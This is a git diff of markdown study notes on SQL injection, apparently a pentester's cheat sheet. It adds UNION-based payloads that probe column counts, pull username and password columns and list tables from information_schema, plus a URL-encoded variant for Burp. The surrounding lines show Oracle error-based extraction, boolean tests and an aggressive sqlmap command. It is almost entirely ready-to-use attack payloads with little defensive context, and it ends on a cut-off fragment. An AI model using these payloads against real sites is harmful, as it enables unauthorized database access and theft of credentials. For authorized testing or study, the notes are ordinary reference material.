@@ -361,7 +361,7 @@ select column_name, data_type from all_tab_columns where table_name = 'MENU';
 ```
 
 
-Error Base SQL Injection (SQL SERVER)
+### Error Base SQL Injection (SQL SERVER)
 
 Errorbase
 MySQL 
@@ -447,16 +447,40 @@ Oracle
 to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
 ```
 
-# 🛡️ SQL Injection - UNION-Based & Database Detection Notes
+### UNION-Based & Database Detection Notes
 
-## 📌 Purpose
+#### Purpose
 To detect and exploit UNION-based SQL Injection vulnerabilities and identify the backend database (MySQL, SQL Server, Oracle, PostgreSQL).
 
 ---
 
+```sql
+' order by 1--
+```
+or for burp 
+
+```sql
+%25%27+order+by+4+--
+```
+
+```sql
+' union select 111, 222, 333, 444---
+```
+
+```sql
+a' union select 111, username, password, 444 from usser--
+```
+
+```sql
+' UNION SELECT NUll, table_name, NULL FROM information_schema.tables--
+```
+
+
+
 ## Step 1: Test for SQL Injection (Boolean-based)
 
 ### True/False Injection Test
+
 ```sql
 ?id=1' AND 1=1-- -
 ?id=1' AND 1=2-- -
@@ -553,3 +577,5 @@ Simple OR condition test:
 ```sql
 sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch --dbs
 ```
+
+Union B
